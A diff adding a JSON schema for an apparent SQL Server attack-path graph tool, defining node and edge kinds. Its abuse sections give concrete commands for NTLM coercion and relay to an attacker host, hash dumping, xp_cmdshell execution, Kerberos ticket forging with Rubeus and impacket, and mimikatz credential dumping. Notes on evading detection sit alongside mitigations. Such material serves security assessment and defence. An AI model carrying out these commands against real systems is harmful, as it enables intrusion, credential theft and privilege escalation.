@@ -1,0 +1,701 @@
+{
+  "schema": {
+    "name": "MSSQL",
+    "display_name": "MSSQL (MSSQLHound)",
+    "version": "v0.0.1",
+    "namespace": "MSSQL"
+  },
+  "node_kinds": [
+    {
+      "name": "MSSQL_ApplicationRole",
+      "display_name": "",
+      "description": "A type of database principal that is not associated with a user but instead is activated by an application using a password so it can interact with the database using the role's permissions.",
+      "is_display_kind": true,
+      "icon": "robot",
+      "color": "#6ff542"
+    },
+    {
+      "name": "MSSQL_Database",
+      "display_name": "",
+      "description": "A collection of database principals (e.g., users and roles) as well as object groups called schemas, each of which contains securable database objects such as tables, views, and stored procedures.",
+      "is_display_kind": true,
+      "icon": "database",
+      "color": "#f54242"
+    },
+    {
+      "name": "MSSQL_DatabaseRole",
+      "display_name": "",
+      "description": "A type of database principal that can be assigned permissions to access database-level objects, such as the ability to connect to the database, access tables, modify database role membership, or execute stored procedures. Database users, user-defined database roles, and application roles can be added as members of database roles, inheriting the role's permissions.",
+      "is_display_kind": true,
+      "icon": "users",
+      "color": "#f5a142"
+    },
+    {
+      "name": "MSSQL_DatabaseUser",
+      "display_name": "",
+      "description": "A user that has access to the specific database it is contained in. Users may be mapped to a login or may be created without a login. Users can be assigned permissions to access database-level objects, such as the ability to connect to the database, access tables, modify database role membership, or execute stored procedures. Users and user-defined database roles can be added as members of database roles, inheriting the role's permissions.",
+      "is_display_kind": true,
+      "icon": "user",
+      "color": "#f5ef42"
+    },
+    {
+      "name": "MSSQL_Login",
+      "display_name": "",
+      "description": "A type of server principal that can be assigned permissions to access server-level objects, such as the ability to connect to the instance or modify server role membership. These principals can be local to the instance (SQL logins) or mapped to a domain user, computer, or group (Windows logins). Server logins can be added as members of server roles to inherit the permissions assigned to the role.",
+      "is_display_kind": true,
+      "icon": "user-gear",
+      "color": "#dd42f5"
+    },
+    {
+      "name": "MSSQL_Server",
+      "display_name": "",
+      "description": "The entire installation of the MSSQL Server database management system (DBMS) that contains multiple databases and server-level objects",
+      "is_display_kind": true,
+      "icon": "server",
+      "color": "#42b9f5"
+    },
+    {
+      "name": "MSSQL_ServerRole",
+      "display_name": "",
+      "description": "A type of server principal that can be assigned permissions to access server-level objects, such as the ability to connect to the instance or modify server role membership. Server logins and user-defined server roles can be added as members of server roles, inheriting the role's permissions.",
+      "is_display_kind": true,
+      "icon": "users-gear",
+      "color": "#6942f5"
+    }
+  ],
+  "relationship_kinds": [
+    {
+      "name": "MSSQL_CoerceAndRelayToMSSQL",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "A computer with a sysadmin login on the SCCM site database can be coerced into authenticating to the site database server, whose MSSQL service does not enforce Extended Protection for Authentication, allowing the coerced authentication to be relayed to MSSQL as that sysadmin login. Control of the site database grants all permissions in SCCM. This is a possible edge, emitted when the relay target's Extended Protection is unset or 'Off' and the sysadmin host's inbound NTLM restriction is unset or 'Off'. The source is the Authenticated Users principal of the coerced computer's domain, and the target is the MSSQL login. Extended Protection is read directly from the target's registry (RemoteRegistry, when reachable) or measured by the MSSQL EPA/encryption probe run during collection; nothing about it is assumed off by default."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Coerce and relay authentication to SQL Server:\n\n### Step 1: Set up an NTLM relay targeting the site database server\n\n```text\nntlmrelayx.py -t mssql://<site_database_server> -smb2support\n```\n\n### Step 2: Trigger authentication from the sysadmin computer using:\n\n- PrinterBug/SpoolSample\n\n```text\nSpoolSample.exe SYSADMIN_COMPUTER ATTACKER_IP\n```\n\n- PetitPotam\n\n```text\nPetitPotam.exe ATTACKER_IP SYSADMIN_COMPUTER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SYSADMIN_COMPUTER -l ATTACKER_IP\n```\n\n### Step 3: The relay logs in to MSSQL as DOMAIN\\COMPUTER$ (a sysadmin), from which\n\nthe site database's RBAC can be modified to grant an arbitrary user any\n\npermission.\n\nSee the Misconfiguration Manager TAKEOVER-1 technique in the References section."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Coerce and relay authentication to SQL Server:\n\n### Step 1: Set up an NTLM relay targeting the site database server\n\n```text\nntlmrelayx.py -t mssql://<site_database_server> -smb2support\n```\n\n### Step 2: Trigger authentication from the sysadmin computer using:\n\n- PetitPotam (unauthenticated)\n\n```text\npython3 PetitPotam.py ATTACKER_IP SYSADMIN_COMPUTER\n```\n\n- Coercer\n\n```text\ncoercer.py coerce -u '' -p '' -t SYSADMIN_COMPUTER -l ATTACKER_IP\n```\n\n- PrinterBug via Wine\n\n```text\nwine SpoolSample.exe SYSADMIN_COMPUTER ATTACKER_IP\n```\n\n### Step 3: The relay logs in to MSSQL as DOMAIN\\COMPUTER$ (a sysadmin), from which\n\nthe site database's RBAC can be modified to grant an arbitrary user any\n\npermission.\n\nSee the Misconfiguration Manager TAKEOVER-1 technique in the References section."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Coercion methods may generate logon events on the target system (Event ID 4624/4625). SQL Server logs will show authentication from the computer account (DOMAIN\\COMPUTER$). This is a possible edge: it is emitted when the relay target's Extended Protection is unset or 'Off' and the sysadmin host's inbound NTLM restriction is unset or 'Off'. Enabling Extended Protection for Authentication on the MSSQL service prevents this attack."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md)\n- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17)\n- [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)\n- [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)\n- [https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n- [https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_AddMember",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_Alter",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_AlterAnyAppRole",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_AlterAnyDBRole",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_AlterAnyLogin",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_AlterAnyServerRole",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_ChangePassword",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_Connect",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_ConnectAnyDatabase",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_Contains",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source object contains the target object. This is a structural relationship showing that the target exists within the scope of the source (for example, a SQL Server containing a database, login, or server role, or a database containing a database user, database role, or application role).\n\nOn the SCCM site database specifically, this structure (the database, the sysadmin role, and the site-server/provider logins and users it contains) is templated from SCCM's own default-schema requirements rather than read out of the live instance. It is trustworthy in proportion to how the site database was identified: fully so when RemoteRegistry, AdminService, or WMI confirmed it, and only an assumption when the server was instead inferred from an MSSQLSvc SPN plus its co-location with other SCCM roles, with nothing confirming it is actually the site database."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "This is a structural relationship and cannot be directly abused. Control of the source object implies control of the target object."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "This is a structural relationship and cannot be directly abused. Control of the source object implies control of the target object."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_Control",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_ControlDB",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The `CONTROL` permission on a database grants the source database user, database role, or application role all defined permissions on the database and its descendent objects. This includes the ability to impersonate any database user, add members to any role, change ownership of objects, and execute any action within the database. WARNING: This includes the ability to change application role passwords, which will break applications using those roles and cause an outage.\n\nWhen the target database is the SCCM site database, this permission is a consequence of SCCM's mandatory default schema (db_owner over `CM_<SiteCode>`) rather than a value read from the database's own permission tables. That inference is only as strong as the site-database identification behind it: solid when RemoteRegistry, AdminService, or WMI confirmed the database server, an assumption when the server was only inferred from an MSSQLSvc SPN plus its co-location with other SCCM roles."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Connect to the target SQL server as the source principal (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n\n```text\nUSE target_database;\n```\n\nImpersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;`\n\nAdd member to role: `EXEC sp_addrolemember 'role_name', 'user_name';`\n\nChange role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];`\n\nChange app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Connect to the target SQL server as the source principal (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n\n```text\nUSE target_database;\n```\n\nImpersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;`\n\nAdd member to role: `EXEC sp_addrolemember 'role_name', 'user_name';`\n\nChange role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];`\n\nChange app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events.\n\nLog events are not generated for user impersonation, role ownership changes, or application role password changes by default. Log events are generated by default for additions to database role membership.\n\nTo view database role membership change logs, execute:\n\n```text\nSELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;\n```"
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions](https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions)\n- [https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_ControlServer",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The `CONTROL SERVER` permission on a server allows the source login or server role to conduct any action in the instance of SQL Server that is not explicitly denied. An exception is for members of the sysadmin server role, in which case explicit denies are ignored.\n\nOn an SCCM site database server, this reflects the sysadmin membership SCCM requires its site-system and provider machine accounts to hold, templated rather than queried from `sys.server_role_members`. Trust it the same way as the site-database identification behind it: solid when RemoteRegistry, AdminService, or WMI confirmed the server; an assumption, weaker and provenance-tagged, when the server was only inferred from an MSSQLSvc SPN plus its co-location with other SCCM roles."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Connect to the target SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n\n```text\nSELECT * FROM sys.sql_logins; -- dump hashes\n```"
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Connect to the target SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n\n```text\nSELECT * FROM sys.sql_logins; -- dump hashes\n```"
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events.\n\nLog event generation is dependent on the action performed."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions](https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions)\n- [https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_ExecuteAs",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_ExecuteAsOwner",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_ExecuteOnHost",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "Control of a SQL Server instance allows xp_cmdshell or other OS command execution capabilities to be used to access the host computer in the context of the account running the SQL server."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';`"
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Enable and use xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';`"
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "xp_cmdshell configuration option changes are logged in SQL Server error logs. View the log by executing: `EXEC sp_readerrorlog 0, 1, 'xp_cmdshell';`"
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_GetAdminTGS",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The SQL Server service account can request Kerberos service tickets for domain accounts that have administrative privileges on this SQL Server."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "From a domain-joined machine as the service account (or with valid credentials):\n\n```text\n# List SPNs for the SQL Server to find target accounts:\nsetspn -L target_sql_server\n# Request TGT for the service account:\n.\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap\n# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:\nRubeus.exe s4u /impersonateuser:<dba> /altservice:<spn> /self /nowrap /ticket:<base64>\n# Start a sacrificial logon session for the Kerberos ticket:\nrunas /netonly /user:asdf powershell\n# Import the ticket into the sacrificial logon session:\nRubeus.exe ptt /ticket:<base64>\n# Launch SQL Server Management Studio or sqlcmd and connect to the database.\n```"
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "From a Linux machine with valid credentials:\n\n```text\n# Request TGT for the service account:\ngetTGT.py internal.lab/sqlsvc:P@ssw0rd\n# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain DBA:\npython3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm$@internal.lab sccm_s4u.ccache -v\n# Connect to the database:\nKRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm$@sql.internal.lab -k -no-pass -windows-auth\n```"
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_GetTGS",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The SQL Server service account can request Kerberos service tickets for domain accounts that have a login on this SQL Server."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "From a domain-joined machine as the service account (or with valid credentials):\n\n```text\n# List SPNs for the SQL Server to find target accounts:\nsetspn -L target_sql_server\n# Request TGT for the service account:\n.\\Rubeus.exe asktgt /domain:<domain_fqdn> /user:<service_account> /password:<password> /nowrap\n# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account:\nRubeus.exe s4u /impersonateuser:<account> /altservice:<spn> /self /nowrap /ticket:<base64>\n# Start a sacrificial logon session for the Kerberos ticket:\nrunas /netonly /user:asdf powershell\n# Import the ticket into the sacrificial logon session:\nRubeus.exe ptt /ticket:<base64>\n# Launch SQL Server Management Studio or sqlcmd and connect to the database.\n```"
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "From a Linux machine with valid credentials:\n\n```text\n# Request TGT for the service account:\ngetTGT.py internal.lab/sqlsvc:P@ssw0rd\n# Get a TGS for the MSSQLSvc SPN using S4U2self, impersonating the domain account:\npython3 gets4uticket.py kerberos+ccache://internal.lab\\sqlsvc:sqlsvc.ccache@dc01.internal.lab MSSQLSvc/sql.internal.lab:1433@internal.lab sccm$@internal.lab sccm_s4u.ccache -v\n# Connect to the database:\nKRB5CCNAME=sccm_s4u.ccache mssqlclient.py internal.lab/sccm$@sql.internal.lab -k -no-pass -windows-auth\n```"
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Kerberos ticket requests are normal behavior and rarely logged. High volume of TGS requests might be detected by advanced threat hunting. Event ID 4769 (Kerberos Service Ticket Request) is logged on domain controllers but typically not monitored for SQL service accounts."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_GrantAnyDBPermission",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_GrantAnyPermission",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_HasDBScopedCred",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_HasLogin",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The domain account has a SQL Server login that is enabled and can connect to the SQL Server. This allows authentication to SQL Server using the account's credentials.\n\nFor the SCCM site-server/provider machine accounts, this login is templated from SCCM's mandatory setup (every site system gets a login on the site database) rather than enumerated from `sys.server_principals`. False positive: if the host that appears to be the site database was only inferred from an MSSQLSvc SPN and general SCCM-relatedness rather than confirmed by RemoteRegistry/AdminService/WMI, the login this edge describes may not actually exist."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Connect to the target SQL server and authenticate as the target login (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py)."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Connect to the target SQL server and authenticate as the target login (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio)."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Windows authentication attempts are logged in SQL Server error logs for failed logins. Successful logins are not logged by default but can be enabled. Computer account authentication appears as DOMAIN\\COMPUTER$."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/server-properties-security-page?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_HasMappedCred",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_HasProxyCred",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_HostFor",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source computer hosts the target SQL Server instance."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "With admin access to the host, you can access the SQL instance:\n\nIf the SQL instance is running as a built-in account (Local System, Local Service, or Network Service), it can be accessed with a SYSTEM context with sqlcmd.\n\nIf the SQL instance is running in a domain service account context, the cleartext credentials can be dumped from LSA secrets with mimikatz `sekurlsa::logonpasswords`, then they can be used to request a service ticket for a domain account with admin access to the SQL instance.\n\nIf there are no domain DBAs, it is still possible to start the instance in single-user mode, which allows any member of the computer's local Administrators group to connect as a sysadmin. WARNING: This is disruptive, possibly destructive, and will cause the database to become unavailable to other users while in single-user mode. It is not recommended."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "If you have root access to the host, you can access SQL Server by manipulating the service or accessing database files directly."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "Host access allows reading memory, modifying binaries, and accessing database files directly."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17)\n- [https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_Impersonate",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_ImpersonateAnyLogin",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_IsMappedTo",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source server login is mapped to the target database user in the associated database.\n\nFor the SCCM site-server/provider logins, this mapping is templated from SCCM's install-time requirement that every site system's machine account become a database user in the site database, not read from `sys.database_principals`. Its reliability tracks the underlying site-database identification: solid when RemoteRegistry, AdminService, or WMI confirmed it, an assumption (and provenance-tagged) when an MSSQLSvc SPN plus SCCM-relatedness stood in for confirmation."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "Connect as the source login and use the associated database: `USE database_name;`"
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "Connect as the source login and use the associated database: `USE database_name;`"
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
+            "content": "This is a static mapping. Actions are logged based on what the database user does."
+          }
+        },
+        "references": {
+          "title": "References",
+          "position": 5,
+          "markdown": {
+            "content": "- [https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17)"
+          }
+        }
+      }
+    },
+    {
+      "name": "MSSQL_IsTrustedBy",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_LinkedAsAdmin",
+      "description": "",
+      "is_traversable": true
+    },
+    {
+      "name": "MSSQL_LinkedTo",
+      "description": "",
+      "is_traversable": false
+    },
+    {
+      "name": "MSSQL_MemberOf",
+      "description": "",
+      "is_traversable": true,
+      "info": {
+        "general": {
+          "title": "General",
+          "position": 1,
+          "markdown": {
+            "content": "The source principal is a member of the target role. This membership grants all permissions associated with the target role to the source principal.\n\nOn the SCCM site database, the db_owner and sysadmin memberships this edge describes for site-server/provider accounts are templated from SCCM's mandatory permission model, not queried from `sys.database_role_members` / `sys.server_role_members`. Treat it with the same confidence as the site-database identification it rests on: solid when RemoteRegistry, AdminService, or WMI confirmed the database server, an assumption that can be wrong when the server was only inferred from an MSSQLSvc SPN plus its co-location with other SCCM roles."
+          }
+        },
+        "windows_abuse": {
+          "title": "Windows Abuse",
+          "position": 2,
+          "markdown": {
+            "content": "When connected to the server/database as the source principal, you have all permissions granted to the target role."
+          }
+        },
+        "linux_abuse": {
+          "title": "Linux Abuse",
+          "position": 3,
+          "markdown": {
+            "content": "When connected to the server/database as the source principal, you have all permissions granted to the target role."
+          }
+        },
+        "opsec": {
+          "title": "Operational Security",
+          "position": 4,
+          "markdown": {
